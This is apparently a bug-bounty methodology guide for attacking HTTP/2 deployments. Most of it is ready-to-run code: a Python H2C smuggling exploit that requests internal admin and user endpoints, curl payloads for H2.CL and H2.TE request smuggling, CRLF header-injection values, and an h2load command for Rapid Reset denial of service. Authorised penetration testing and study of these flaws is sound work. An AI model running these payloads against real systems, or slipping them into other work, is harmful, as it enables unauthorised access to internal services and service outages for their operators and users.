# HTTP/2 Attacks — Deep Testing Methodology

## Overview
HTTP/2 introduces new attack surfaces due to its binary framing, header compression (HPACK), stream multiplexing, and connection coalescing. These attacks are **emerging P1/Critical** findings that most pentesting tools completely miss.

## Why This Matters
- HTTP/2 is now the default for most modern web servers and CDNs
- H2C smuggling bypasses reverse proxy security entirely
- Most WAFs and security tools don't inspect HTTP/2 traffic properly
- Very few researchers test for these — low competition, high payouts

## H2C Smuggling (HTTP/2 Cleartext Upgrade)

### Detection
```bash
# Check if target supports H2C upgrade
curl -v --http2 "https://TARGET/" 2>&1 | grep -i "HTTP/2"

# Test H2C upgrade via HTTP/1.1 Upgrade header
# If the reverse proxy forwards the Upgrade header, you can smuggle H2C
curl -v "https://TARGET/" \
  -H "Upgrade: h2c" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -H "HTTP2-Settings: AAMAAABkAAQAAP__" 2>&1

# Check various paths
for path in / /api/ /internal/ /admin/ /health /metrics; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET${path}" \
    -H "Upgrade: h2c" \
    -H "Connection: Upgrade, HTTP2-Settings" \
    -H "HTTP2-Settings: AAMAAABkAAQAAP__")
  echo "$path → $resp"
done
```

### Exploitation
```python
import h2.connection
import h2.config
import h2.events
import socket
import ssl

def h2c_smuggle(target, port, path):
    """
    H2C smuggling: bypass reverse proxy to access internal endpoints.
    The proxy sees an HTTP/1.1 Upgrade request but the backend
    processes it as HTTP/2, allowing access to paths the proxy blocks.
    """
    # Connect
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    sock = socket.create_connection((target, port))
    if port == 443:
        sock = ctx.wrap_socket(sock, server_hostname=target)
    
    # Send HTTP/1.1 upgrade request
    upgrade_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"Upgrade: h2c\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
        f"\r\n"
    )
    sock.sendall(upgrade_request.encode())
    
    # Read response
    response = sock.recv(4096)
    print(f"Upgrade response: {response[:200]}")
    
    if b"101" in response or b"Switching" in response:
        print("[VULN] H2C upgrade accepted — proxy may be vulnerable to smuggling")
        
        # Now send HTTP/2 frames to access internal paths
        config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        
        # Request internal endpoint
        conn.send_headers(1, [
            (':method', 'GET'),
            (':path', path),
            (':authority', target),
            (':scheme', 'https'),
        ], end_stream=True)
        sock.sendall(conn.data_to_send())
        
        # Read response
        data = sock.recv(65535)
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                print(f"  Status: {dict(event.headers).get(':status')}")
            elif isinstance(event, h2.events.DataReceived):
                print(f"  Body: {event.data[:500]}")
    
    sock.close()

# Test accessing internal endpoints via H2C smuggling
h2c_smuggle("TARGET", 443, "/admin/")
h2c_smuggle("TARGET", 443, "/internal/metrics")
h2c_smuggle("TARGET", 443, "/api/internal/users")
h2c_smuggle("TARGET", 443, "/server-status")
```

## HTTP/2 Request Smuggling (H2.CL / H2.TE)

### Detection
```python
import requests

# H2.CL: HTTP/2 Content-Length desync
# Some proxies don't validate CL in HTTP/2 frames
# Smuggle a second request inside the body

# Test with curl (HTTP/2)
import subprocess

# H2.CL test
subprocess.run([
    'curl', '--http2', '-X', 'POST', 'https://TARGET/',
    '-H', 'Content-Length: 0',
    '-H', 'Content-Type: application/x-www-form-urlencoded',
    '-d', 'GET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n',
    '-v'
])
```

### H2.TE (Transfer-Encoding in HTTP/2)
```bash
# HTTP/2 spec says Transfer-Encoding should be ignored
# But some backends process it anyway

# Use h2csmuggler tool
# pip install h2csmuggler
h2csmuggler -x "https://TARGET/" --test

# Manual test
curl --http2 -X POST "https://TARGET/" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n" \
  -v
```

## HPACK Header Injection

### Detection
```python
# HPACK is HTTP/2's header compression
# Some implementations allow injecting headers via HPACK table poisoning

# Test: Send headers that might confuse proxy/backend
import subprocess

headers_to_test = [
    # Pseudo-header injection
    ("x-test", ":authority: internal.target.com"),
    # Header with CRLF (should be rejected in H2 but some fail)
    ("x-inject", "value\r\nX-Admin: true"),
    # Path override
    ("x-original-url", "/admin"),
    ("x-rewrite-url", "/admin"),
    # Method override in H2
    ("x-http-method-override", "ADMIN"),
]

for name, value in headers_to_test:
    result = subprocess.run([
        'curl', '--http2', '-s', '-o', '/dev/null', '-w', '%{http_code}',
        'https://TARGET/',
        '-H', f'{name}: {value}'
    ], capture_output=True, text=True)
    print(f"{name}: {value[:40]}... → {result.stdout}")
```

## HTTP/2 Stream Reset Attack (Rapid Reset / CVE-2023-44487)

### Detection
```bash
# Check if target is vulnerable to Rapid Reset DoS
# This is a resource exhaustion attack via stream RST_STREAM

# Check HTTP/2 support first
curl -sI --http2 "https://TARGET/" 2>&1 | grep -i "HTTP/2"

# Test with h2load (nghttp2 toolkit)
h2load -n 1000 -c 10 -m 100 "https://TARGET/"
# If the server crashes or becomes unresponsive → vulnerable

# Check server version for known-vulnerable versions
curl -sI "https://TARGET/" | grep -i "Server"
# Vulnerable: nginx < 1.25.3, Apache < 2.4.58, Node.js < 18.18.2/20.8.1
```

## Connection Coalescing Attacks

### Detection
```bash
# HTTP/2 allows reusing a connection for different hostnames
# if they share the same IP + TLS certificate (SAN/wildcard)

# Check if wildcard cert is used
echo | openssl s_client -connect TARGET:443 -servername TARGET 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# If *.target.com → connection coalescing is possible
# An attacker could:
# 1. Coalesce requests from different subdomains
# 2. Access internal subdomains via shared connection
# 3. Cache poisoning across domains sharing a cert
```

## Severity Classification
| Finding | Severity | CVSS |
|---------|----------|------|
| H2C smuggling → access to internal endpoints | Critical | 9.1 |
| H2.CL/H2.TE request smuggling | Critical | 9.8 |
| HTTP/2 Rapid Reset DoS | High | 7.5 |
| HPACK header injection → auth bypass | High | 8.1 |
| Connection coalescing → cross-domain access | Medium | 6.5 |

## Tools
- **h2csmuggler**: H2C smuggling detection/exploitation
- **h2load**: HTTP/2 benchmarking and DoS testing
- **nghttp**: HTTP/2 client for manual testing
- **hyper-h2**: Python HTTP/2 library for custom exploits
- **Burp Suite**: HTTP/2 support in newer versions
